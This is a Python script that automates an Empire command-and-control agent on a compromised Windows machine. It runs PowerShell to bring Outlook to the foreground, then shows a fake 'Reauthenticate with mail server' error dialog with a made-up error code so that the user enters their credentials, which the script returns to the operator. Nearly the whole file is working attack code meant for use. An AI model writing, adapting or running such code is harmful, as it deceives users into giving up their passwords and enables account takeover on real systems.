"""
Brings Outlook foreground & prompts for credentials capture.
"""
from EmpireAPIWrapper import empireAPI
from c2_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
from autocomplete.empire import collection, management

def run(API, agent_name):
    """
    Returns user credentials
    :param API: EmpireAPIWrapper object
    :param agent_name: name of agent
    :return type: str or None
    """

    # Step 1 - Bring outlook foreground
    show_outlook_psh = """
        $sig = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        Add-Type -MemberDefinition $sig -name NativeMethods -namespace Win32
        $h =  (get-process OUTLOOK).MainWindowHandle
        if($h) { # bring foreground
            [Win32.NativeMethods]::ShowWindowAsync($h, 3)
        }
        else { # start a new process
            start Outlook
        }
    """
    opts = {'Agent': agent_name, 'command': show_outlook_psh}    
    API.agent_run_shell_cmd(agent_name, opts)
    
    # Step 2 - Prompt for Credentials
    options = collection.prompt.options
    params = {
                options.required_agent: agent_name,
                options.required_icontype: 'Exclamation',
                options.required_msgtext: 'Reauthenticate with mail server',
                options.required_title: 'ERROR - 0x8000CCC18'
            }
    return API.module_exec_with_result(collection.prompt.path, params, agent_name)


if __name__ == '__main__': # unit test
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    print(run(API, API.agents()['agents'][0]['name']))